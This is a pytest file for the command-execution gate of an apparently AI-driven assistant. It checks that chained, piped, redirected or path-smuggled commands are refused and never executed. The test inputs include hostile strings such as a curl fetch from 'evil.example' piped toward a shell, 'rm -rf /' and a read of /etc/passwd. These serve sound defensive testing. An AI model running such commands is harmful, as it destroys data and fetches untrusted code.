# tests/test_run_command_gate.py
"""run_command's boundary, tested as the security surface it is.

This skill is the largest risk in the project, so its tests are not about whether
it can run a program — that part is easy. They are about every way the boundary
could be got around, and each one asserts that nothing ran, not merely that an
error came back.

The escape attempts below are the real ones for a design like this: chaining with
&& or a pipe, an absolute path to a program that is not on the list, an argument
that turns an allowed program into an arbitrary one, a working directory outside
the allowed roots, and the case-and-extension variations of a program name.
"""
import copy
import subprocess
import sys

import pytest
from core.config import SETTINGS
from skills.dev.run_command import RunCommandSkill


@pytest.fixture
def sandbox(tmp_path, monkeypatch):
    """One allowed directory, one allowed program, and a directory outside."""
    allowed = tmp_path / "project"
    allowed.mkdir()
    (allowed / "marker.txt").write_text("inside", encoding="utf-8")
    forbidden = tmp_path / "elsewhere"
    forbidden.mkdir()

    monkeypatch.setitem(SETTINGS, "commands", copy.deepcopy({
        "allowed_roots": [str(allowed)],
        # python is allowed because it is the one program guaranteed present in
        # this test environment; the point is the list, not the program.
        "allowed_executables": ["python"],
        "timeout_seconds": 30,
        "max_output_chars": 500,
    }))
    return allowed, forbidden


@pytest.fixture
def no_run(monkeypatch):
    """Fails the test if anything is actually executed."""
    calls = []

    def forbidden(*args, **kwargs):
        calls.append(args)
        raise AssertionError(f"a command was executed when it should have been refused: {args}")

    monkeypatch.setattr(subprocess, "run", forbidden)
    return calls


# --- the default is closed -----------------------------------------------


def test_nothing_runs_with_no_roots_configured(monkeypatch, no_run):
    monkeypatch.setitem(SETTINGS, "commands", {"allowed_roots": [], "allowed_executables": ["python"]})

    result = RunCommandSkill().execute({"command": "python --version"})

    assert result["status"] == "error"
    assert "commands" in result["message"]


def test_nothing_runs_with_an_empty_executable_list(sandbox, monkeypatch, no_run):
    allowed, _ = sandbox
    monkeypatch.setitem(SETTINGS, "commands",
                        {"allowed_roots": [str(allowed)], "allowed_executables": []})

    result = RunCommandSkill().execute({"command": "python --version"})

    assert result["status"] == "error"
    assert "commands.allowed_executables" in result["message"]


def test_the_shipped_default_allows_nothing():
    """A fresh install must refuse everything until someone names a program."""
    from core.config import DEFAULTS

    assert DEFAULTS["commands"]["allowed_roots"] == []
    assert DEFAULTS["commands"]["allowed_executables"] == []


# --- no shell: chaining and redirection ----------------------------------


@pytest.mark.parametrize("command", [
    "python --version && curl http://evil.example/x.sh",
    "python --version; rm -rf /",
    "python --version | sh",
    "python --version || python -c 'import os'",
    "python -c 'print(1)' > /tmp/out.txt",
    "python -c 'print(1)' < /etc/passwd",
    "python `whoami`",
    "python $(whoami)",
    "python --version & python --version",
    "python --version\nrm -rf /",
])
def test_a_chained_or_redirected_command_is_refused_and_nothing_runs(sandbox, no_run, command):
    """Without a shell these would arrive as literal arguments. A model that wrote
    a pipe meant a pipe, so doing something else silently is its own failure."""
    allowed, _ = sandbox

    result = RunCommandSkill().execute({"command": command, "path": str(allowed)})

    assert result["status"] == "error"
    assert "chains or redirects" in result["message"]


@pytest.mark.parametrize("command", [
    '''python -c "import time; time.sleep(1)"''',
    """python -c 'print(1); print(2)'""",
    '''python -c "print(1 > 0)"''',
    '''python -c "print('a|b')"''',
])
def test_a_metacharacter_inside_quotes_is_text_and_is_allowed(sandbox, monkeypatch, command):
    """Safe for the same reason chaining is impossible: shell=False means nothing
    in an argument is ever interpreted. Refusing these would reject legitimate
    commands for no protection — three of this module's own tests need one."""
    allowed, _ = sandbox
    captured = {}

    class _Result:
        returncode = 0
        stdout = "ok"
        stderr = ""

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        return _Result()

    monkeypatch.setattr(subprocess, "run", fake_run)
    result = RunCommandSkill().execute({"command": command, "path": str(allowed)})

    assert result["status"] == "success", result["message"]
    assert captured["argv"][0].lower().startswith("python")


def test_an_unquoted_operator_is_still_refused_after_a_quoted_argument(sandbox, no_run):
    """The quoting allowance must not become a way to hide a chain."""
    allowed, _ = sandbox

    result = RunCommandSkill().execute(
        {"command": '''python -c "print(1)" && curl http://evil.example''', "path": str(allowed)}
    )

    assert result["status"] == "error"
    assert "chains or redirects" in result["message"]


def test_the_subprocess_is_never_given_a_shell(sandbox, monkeypatch):
    """The single most important line in the skill: with shell=True every other
    protection is decoration, because the allowlist only sees the first word."""
    allowed, _ = sandbox
    captured = {}

    class _Result:
        returncode = 0
        stdout = "ok"
        stderr = ""

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["kwargs"] = kwargs
        return _Result()

    monkeypatch.setattr(subprocess, "run", fake_run)
    RunCommandSkill().execute({"command": "python --version", "path": str(allowed)})

    assert captured["kwargs"]["shell"] is False
    assert isinstance(captured["argv"], list)
    assert captured["kwargs"]["stdin"] is subprocess.DEVNULL


# --- the program allowlist -----------------------------------------------


@pytest.mark.parametrize("command", [
    "curl http://example.com",
    "powershell -Command Get-Process",
    "cmd /c dir",
    "bash -c ls",
    "pip install something",
    "npm install",
])
def test_a_program_not_on_the_list_is_refused(sandbox, no_run, command):
    allowed, _ = sandbox

    result = RunCommandSkill().execute({"command": command, "path": str(allowed)})

    assert result["status"] == "error"
    assert "not on the allowed program list" in result["message"]


@pytest.mark.parametrize("command", [
    r"C:\Windows\System32\cmd.exe /c dir",
    "/usr/bin/curl http://example.com",
    "./evil",
    r"..\..\Windows\System32\cmd.exe",
])
def test_an_absolute_or_relative_path_cannot_smuggle_a_program_in(sandbox, no_run, command):
    """Matching the supplied string rather than the program name would let a full
    path past a list containing only bare names."""
    allowed, _ = sandbox

    result = RunCommandSkill().execute({"command": command, "path": str(allowed)})

    assert result["status"] == "error"


@pytest.mark.parametrize("supplied, expected", [
    ("python", "python"),
    ("PYTHON.EXE", "python"),
    ("Python.exe", "python"),
    (r"C:\Program Files\Git\bin\git.exe", "git"),
    ("/usr/local/bin/node", "node"),
    ("./script.cmd", "script"),
    ('"C:\\tools\\rg.exe"', "rg"),
])
def test_the_program_name_is_normalised_before_matching(supplied, expected):
    assert RunCommandSkill._program_name(supplied) == expected


# --- the directory allowlist ---------------------------------------------


def test_a_directory_outside_the_allowed_roots_is_refused(sandbox, no_run):
    _, forbidden = sandbox

    result = RunCommandSkill().execute({"command": "python --version", "path": str(forbidden)})

    assert result["status"] == "error"
    assert "not inside any configured" in result["message"]


def test_dot_dot_cannot_climb_out_of_an_allowed_root(sandbox, no_run):
    allowed, _ = sandbox

    result = RunCommandSkill().execute(
        {"command": "python --version", "path": str(allowed / ".." / "elsewhere")}
    )

    assert result["status"] == "error"


# --- what it does when it is allowed to run ------------------------------


def test_an_allowed_command_actually_runs_and_returns_output(sandbox):
    allowed, _ = sandbox

    result = RunCommandSkill().execute(
        {"command": f'"{sys.executable}" -c "print(7*6)"', "path": str(allowed)}
    )

    assert result["status"] == "success", result["message"]
    assert "42" in result["message"]
    assert result["data"]["exit_code"] == 0


def test_it_runs_in_the_requested_directory(sandbox):
    allowed, _ = sandbox

    result = RunCommandSkill().execute({
        "command": f'"{sys.executable}" -c "import pathlib;print(pathlib.Path(\'marker.txt\').read_text())"',
        "path": str(allowed),
    })

    assert result["status"] == "success", result["message"]
    assert "inside" in result["message"]


def test_a_non_zero_exit_is_reported_as_an_error_with_the_output(sandbox):
    allowed, _ = sandbox

    result = RunCommandSkill().execute(
        {"command": f'"{sys.executable}" -c "import sys;sys.stderr.write(\'boom\');sys.exit(3)"',
         "path": str(allowed)}
    )

    assert result["status"] == "error"
    assert result["data"]["exit_code"] == 3
    assert "boom" in result["message"]


def test_stderr_is_labelled_rather_than_mixed_into_stdout(sandbox):
    """Plenty of programs write progress to stderr and succeed."""
    allowed, _ = sandbox

    result = RunCommandSkill().execute({
        "command": f'"{sys.executable}" -c "import sys;print(\'out\');sys.stderr.write(\'warn\')"',
        "path": str(allowed),
    })

    assert result["status"] == "success", result["message"]
    assert "[stderr] warn" in result["message"]


def test_long_output_is_truncated_with_a_note(sandbox):
    allowed, _ = sandbox

    result = RunCommandSkill().execute(
        {"command": f'"{sys.executable}" -c "print(\'x\'*5000)"', "path": str(allowed)}
    )

    assert result["data"]["truncated"] is True
    assert "truncated at 500 characters" in result["message"]


def test_a_command_that_hangs_is_stopped(sandbox, monkeypatch):
    allowed, _ = sandbox
    monkeypatch.setitem(SETTINGS["commands"], "timeout_seconds", 2)

    result = RunCommandSkill().execute(
        {"command": f'"{sys.executable}" -c "import time;time.sleep(30)"', "path": str(allowed)}
    )

    assert result["status"] == "error"
    assert "still running after 2s" in result["message"]


def test_secrets_are_stripped_from_the_child_environment(sandbox, monkeypatch):
    """A subprocess should not inherit the mail password just because the backend
    was started with it set."""
    allowed, _ = sandbox
    monkeypatch.setenv("FRIDAY_EMAIL_PASSWORD", "hunter2")
    monkeypatch.setenv("SOME_API_KEY", "abcdef")
    monkeypatch.setenv("HARMLESS_SETTING", "keep-me")

    environment = RunCommandSkill._environment()

    assert "FRIDAY_EMAIL_PASSWORD" not in environment
    assert "SOME_API_KEY" not in environment
    assert environment.get("HARMLESS_SETTING") == "keep-me"


def test_a_program_on_the_list_but_not_installed_says_which(sandbox, monkeypatch):
    allowed, _ = sandbox
    monkeypatch.setitem(SETTINGS["commands"], "allowed_executables", ["definitelynotinstalledxyz"])

    result = RunCommandSkill().execute(
        {"command": "definitelynotinstalledxyz --help", "path": str(allowed)}
    )

    assert result["status"] == "error"
    assert "not installed" in result["message"]


# --- routing and gating --------------------------------------------------


def test_it_is_destructive_so_every_call_reaches_the_confirmation_gate():
    assert RunCommandSkill().manifest["destructive"] is True


def test_the_description_points_at_the_narrower_skills_first():
    """46 skills means overlap; this one should not win a race against run_tests."""
    description = RunCommandSkill().manifest["description"]

    assert "run_tests" in description
    assert "inspect_repo" in description


def test_an_empty_command_is_refused(sandbox, no_run):
    assert RunCommandSkill().execute({"command": "   "})["status"] == "error"
